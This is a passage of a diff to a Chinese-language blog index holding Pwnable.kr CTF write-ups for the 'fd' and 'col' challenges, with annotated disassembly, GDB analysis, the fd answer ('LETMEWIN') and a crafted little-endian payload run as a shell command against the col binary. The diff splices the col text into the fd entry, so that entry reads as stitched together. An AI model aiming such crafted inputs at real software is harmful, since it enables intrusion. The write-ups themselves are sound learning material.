-<p>80484bb:    mov    0xc(%ebp),%eax//当有输入参数的执行流。<br> 80484be:   add    $0x4,%eax<br> 80484c1:    mov    (%eax),%eax<br> 80484c3:   mov    %eax,(%esp)<br> 80484c6:  call   80483d0 &lt;atoi@plt&gt; //将输入的字符串转为数字(十六进制)<br> 80484cb: sub    $0x1234, $eax //eax此刻保存着输入参数的值，十六进制值减去0x1234<br> 80484d0:    mov    %eax,0x18(%esp) //保存数据已经减去0x1234<br> 80484d4: movl    $0x0,0x1c($ %esp)<br> 80484db:    00<br> 80484dc: movl   $0x20,0x8(%esp)//第三个参数<br> 80484e3:  00<br> 80484e4: movl   $ $0x804a060,0x4(%esp)//第二个参数，保存数据的内存位置<br> 80484eb:    08<br> 80484ec: mov    0x18(%esp),%eax<br> 80484f0: mov    %eax,(%esp) //第一个参数（文件描述符）<br> 80484f3: call   8048370 &lt; read@plt&gt;//根据文件描述符来判断输入还是输出<br> 80484f8:    mov    %eax,0x1c(%esp)<br> 80484fc:   mov    $0x8048646, %edx<br> 8048501:   mov    $0x804a060,%eax<br> 8048506:    mov    $ $0xa,%ecx<br> 804850b:     mov    %edx,%esi<br> 804850d:     mov    %eax,%edi<br> 804850f:    repz cmpsb %es:(%edi),%ds:(%esi)<br> 8048511:    seta   %dl<br> 8048514:    setb   %al<br> 8048517:    mov    %edx,%ecx<br> 8048519:    sub    %al,%cl<br> 804851b:      mov    %ecx,%eax<br> 804851d:    movsbl %al,%eax<br> 8048520:    test   %eax,%eax //输入的数据和0x8048060保存的数据作对比<br> 8048522:    jne    8048548 &lt;main+0xb4&gt;//如果正确则输出flag,错误则结束<br> 8048524:    movl   $0x8048650,(%esp)<br> 804852b:   call   8048380 &lt;puts@plt&gt;<br> 8048530:    movl   $0x804865c,(%esp)<br> 8048537:    call   8048390 &lt;system@plt&gt;<br> 804853c:    movl   $0x0,(%esp)<br> 8048543:    call   80483b0 &lt;exit@plt&gt;<br> 8048548:    movl   $0x804866a,(%esp)<br> 804854f:      call   8048380 &lt;puts@plt&gt;<br> 8048554:    mov    $0x0,%eax<br> 8048559:    lea    -0x8(%ebp),%esp<br> 804855c:   pop    %esi<br> 804855d:   pop    %edi<br> 804855e:    pop    %ebp<br> 804855f:    ret  </p>
+<p>下完断点，将程序运行起来，输入“1234567890qwertyuiop”,看程序是怎样运算字符。</p>
 </blockquote>
-<h3 id="文件描述符简介"><a href="#文件描述符简介" class="headerlink" title="文件描述符简介"></a>文件描述符简介</h3><table>
-<thead>
-<tr>
-<th>项文件描述符</th>
-<th align="right">缩写</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td align="right">STDIN</td>
-<td align="center">标准输入</td>
-</tr>
-<tr>
-<td>1</td>
-<td align="right">STDOUT</td>
-<td align="center">标准输出</td>
-</tr>
-<tr>
-<td>2</td>
-<td align="right">STDERR</td>
-<td align="center">标准错误输出</td>
-</tr>
-</tbody></table>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p4.png" alt=""></p>
 <blockquote>
-<p>通俗讲解：<br>当项文件描述符为0时：可理解为要从键盘输入内存，即为和计算机交互时的输入。<br>当项文件描述符为1时：可理解为从内存显示到显示器，即为和计算机交互时的输出。<br>当项文件描述符为2时：可理解为出现错误时的输出，即为和计算机交互时出现错误会显示到显示器。</p>
+<p>过程这里就不详细描述了，可以发现程序将20个字符分成五部分，每部分4个字符，将转换后的数值累加起来，最后等于0x21dd09ec 。这样思路就有了。</p>
 </blockquote>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><blockquote>
-<ol>
-<li>首先要保证有一个参数，不然程序会报错。<ol start="2">
-<li>参数减去4660，等于文件描述符。</li>
-<li>文件描述符必须为0，这样才会有接下来的输入。</li>
-<li>输入会和内存中的数据进行对比。</li>
-<li>使用GDB调试可得内存作比较的内容为“LETMEWIN”<br>所以解题为先输入4660，再输入“LETMEWIN”。</li>
-</ol>
-</li>
-</ol>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><blockquote>
+<p>既然这样我们可以将0x21dd09ec=568134124(10进制)<br>568134124 % 5=4<br>(568134124-4)/5==113626824<br>这样就得到了前四个数(十进制)<br>最后一个数是113626824+4=113626828<br>转化为十六进制分别是为0x6c5cec8   0x6c5cecc<br>但要注意的是内存中小端存贮，<br>payload=’\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06’<br>可以使用ssh连接，然后使用下面命令：</p>
 </blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;col &#96;python -c &#39;print &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; &#39; &#96;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>再次使用ssh连接</p>
+<p>关于数字的组合有很多种，不局限于这一种。</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p8.png" alt=""></p>
-<h3 id="IDA反编译源码"><a href="#IDA反编译源码" class="headerlink" title="IDA反编译源码"></a>IDA反编译源码</h3><blockquote>
-<p>可以使用IDA，按下F5反编译源码。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p9.png" alt=""></p>
-<blockquote>
-<p>fd.c文件代码：</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180326/p10.png" alt=""></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
-<p>这是Pwnable.kr的第一题，分析的比较细致，学到了很多知识。里面的一些东西还不太清楚，希望在以后的学习过程中能有所顿悟。</p>
-</blockquote>
-<p>个人总结，难免有错。欢迎大佬留言指正，共同交流。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://blog.csdn.net/xlinsist/article/details/51147212" target="_blank" rel="noopener">https://blog.csdn.net/xlinsist/article/details/51147212</a><br> <a href="https://www.cnblogs.com/orlion/p/5765339.html" target="_blank" rel="noopener">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
+<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p5.png" alt=""></p>
+<p>个人拙见，如有错请大佬指正！</p>
 ]]></content>
       <categories>
         <category>其他</category>
@@ -1354,57 +1446,6 @@
       <tags>
         <tag>Android</tag>
         <tag>反调试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pwnable.kr题解之col</title>
-    <url>/2018/03/31/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8Bcol/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>这是第二道Pwn练习collision。链接pwnable.kr,下面简单讲解下分析过程。</p>
-</blockquote>
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><blockquote>
-<p>前面的一些下载链接操作这里就不介绍了。直接从linux系统开始调试。<br>首先运行下程序，对程序整体有个把握。</p>
-</blockquote>
-<a id="more"></a>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p1.png" alt=""></p>
-<blockquote>
-<p>可以看到程序运行需要一个参数，而且要20个字节</p>
-</blockquote>
-<blockquote>
-<p>再使用命令将程序反编译，查看主要函数与代码。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d col</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>观察发现有一个check_password函数，观察貌似是运算相加，然后比较，</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p2.png" alt=""></p>
-<blockquote>
-<p>接下来请出调试神器—GDB，在check_password下断点。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p3.png" alt=""></p>
-<blockquote>
-<p>下完断点，将程序运行起来，输入“1234567890qwertyuiop”,看程序是怎样运算字符。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p4.png" alt=""></p>
-<blockquote>
-<p>过程这里就不详细描述了，可以发现程序将20个字符分成五部分，每部分4个字符，将转换后的数值累加起来，最后等于0x21dd09ec 。这样思路就有了。</p>
-</blockquote>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><blockquote>
-<p>既然这样我们可以将0x21dd09ec=568134124(10进制)<br>568134124 % 5=4<br>(568134124-4)/5==113626824<br>这样就得到了前四个数(十进制)<br>最后一个数是113626824+4=113626828<br>转化为十六进制分别是为0x6c5cec8   0x6c5cecc<br>但要注意的是内存中小端存贮，<br>payload=’\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06’<br>可以使用ssh连接，然后使用下面命令：</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;col &#96;python -c &#39;print &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; &#39; &#96;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>关于数字的组合有很多种，不局限于这一种。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p5.png" alt=""></p>
-<p>个人拙见，如有错请大佬指正！</p>
-]]></content>
-      <categories>
-        <category>其他</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
